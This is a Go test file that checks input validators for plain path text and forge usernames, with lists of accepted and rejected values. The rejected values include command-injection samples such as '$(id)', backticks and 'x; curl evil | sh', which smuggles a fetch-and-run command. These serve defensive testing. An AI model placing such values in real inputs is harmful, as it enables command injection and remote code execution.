package plain_test

import (
	"strings"
	"testing"

	"github.com/frontseat-dev/frontseat/server/internal/plain"
)

// A text written plainly is a path's characters, and something.
func TestATextIsWrittenPlainly(t *testing.T) {
	for _, text := range []string{"someone/code.git", "/usr/bin/git", "git-upload-pack", "a_b+c.d"} {
		if !plain.Text(text) {
			t.Errorf("%q was refused", text)
		}
	}
	for _, text := range []string{"", "a b", "a\nb", "a?b", "a=b", "a%2e", "$(id)", "a`b`", "a'b", `a"b`, "a\\b", "a:b"} {
		if plain.Text(text) {
			t.Errorf("%q was taken", text)
		}
	}
}

// A username is one a forge gives, and nothing a shell or a
// configuration would read otherwise.
func TestAUsernameIsOneAForgeGives(t *testing.T) {
	for _, name := range []string{"x-access-token", "someone", "some.one_2@example.org", strings.Repeat("a", 128)} {
		if !plain.Username(name) {
			t.Errorf("%q was refused", name)
		}
	}
	for _, name := range []string{"", "x; curl evil | sh", "a b", "a\nb", "$(id)", "a`b`", "a'b", `a"b`, "a\\b", "a=b", "a/b", strings.Repeat("a", 129)} {
		if plain.Username(name) {
			t.Errorf("%q was taken", name)
		}
	}
}
